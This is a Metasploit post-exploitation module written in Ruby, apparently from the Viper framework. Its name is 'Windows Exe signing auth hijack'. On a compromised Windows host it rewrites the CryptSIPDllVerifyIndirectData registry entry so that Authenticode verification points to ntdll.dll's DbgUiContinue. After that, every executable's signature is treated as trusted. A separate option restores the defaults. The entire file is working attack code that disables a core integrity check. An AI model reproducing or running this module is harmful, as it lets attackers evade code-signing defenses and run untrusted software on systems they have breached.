##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/common'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv


  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Windows Exe signing auth hijack',
                      'Description'  => %q{
        This module hijack windows default sign function and make all authenticode trusted.
      },
                      'License'      => MSF_LICENSE,
                      'Author'       => ['viper',],
                      'Platform'     => ['win'],
                      'SessionTypes' => ['meterpreter']
          ))

    register_options(
            [
                    OptEnum.new('ACTION', [true, 'Hijack or recovery', 'Hijack', ['Hijack', 'Recovery']]),
            ])
  end

  # Run Method for when run command is issued
  def run

    unless session.type == "meterpreter"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                      self.uuid)
      return
    end
    # unless is_system? || is_admin?
    #   pub_json_result(false,
    #                   "Insufficient privileges to create service",
    #                   nil,
    #                   self.uuid)
    #   return
    # end
    #
    # syinfo is only on meterpreter sessions
    vprint_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
    reg_base_key = "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}"
    # reg_base32_key   = "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}"
    reg_dll_val      = "Dll"
    reg_FuncName_val = "FuncName"

    defalut_Dll      = "WINTRUST.DLL"
    default_FuncName = "CryptSIPVerifyIndirectData"
    hijack_Dll       = "ntdll.dll"
    hijack_FuncName  = "DbgUiContinue"

    unless registry_key_exist? reg_base_key
      unless registry_createkey(reg_base_key)
        pub_json_result(false,
                        'create registry failed',
                        nil,
                        self.uuid)
      end
    end

    if datastore['ACTION'] == 'Hijack'
      if registry_setvaldata(reg_base_key, reg_dll_val, hijack_Dll, "REG_SZ")
        nil
      else
        vprint_error("change registry failed")
        pub_json_result(false,
                        'write registry failed',
                        nil,
                        self.uuid)
      end
      if registry_setvaldata(reg_base_key, reg_FuncName_val, hijack_FuncName, "REG_SZ")
        vprint_good("Hijack success")
        pub_json_result(true,
                        nil,
                        datastore['ACTION'],
                        self.uuid)
        return
      else
        vprint_error("change registry failed")
        pub_json_result(false,
                        'write registry failed',
                        nil,
                        self.uuid)
      end
    else
      if registry_setvaldata(reg_base_key, reg_dll_val, defalut_Dll, "REG_SZ")
        nil
      else
        vprint_error("change registry failed")
        pub_json_result(false,
                        'write registry failed',
                        nil,
                        self.uuid)
      end
      if registry_setvaldata(reg_base_key, reg_FuncName_val, default_FuncName, "REG_SZ")
        vprint_good("Recovery success")
        pub_json_result(true,
                        nil,
                        datastore['ACTION'],
                        self.uuid)
        return
      else
        vprint_error("change registry failed")
        pub_json_result(false,
                        'write registry failed',
                        nil,
                        self.uuid)
      end
    end
  end
end
